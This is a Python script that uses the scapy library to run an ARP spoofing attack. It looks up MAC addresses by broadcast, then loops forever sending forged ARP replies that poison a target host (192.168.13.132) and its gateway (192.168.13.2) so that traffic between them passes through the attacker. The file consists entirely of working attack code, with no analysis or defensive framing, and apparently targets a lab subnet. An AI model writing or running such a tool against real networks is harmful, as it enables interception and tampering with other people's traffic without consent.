import scapy.all as scapy
import time
import sys

def get_mac_addr(ip):

    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast = broadcast/arp_request

    answer , unanswered = scapy.srp(arp_broadcast,timeout=1,verbose=False)
    MAC_Address_and_IP = dict()

    for answer_item in answer:
        extract_ip = answer_item[1].psrc
        extract_mac = answer_item[1].hwsrc
        if extract_ip not in MAC_Address_and_IP.keys():
            MAC_Address_and_IP[extract_ip] = extract_mac

    return MAC_Address_and_IP[ip]


def spoof(target_ip,spoof_ip):

    target_mac_addr = get_mac_addr(target_ip)
    packet = scapy.ARP(op=2,pdst = target_ip, hwdst = target_mac_addr ,psrc=spoof_ip)
    ether = scapy.Ether(dst=target_mac_addr)
    packet = ether / packet
    scapy.srp(packet,timeout=1, verbose=False)

counter = 0
while(True):
    spoof('192.168.13.132','192.168.13.2')
    spoof('192.168.13.2','192.168.13.132')
    counter+=2
    print(f'\r[+] {counter} Packet sent.',end='')
    time.sleep(2)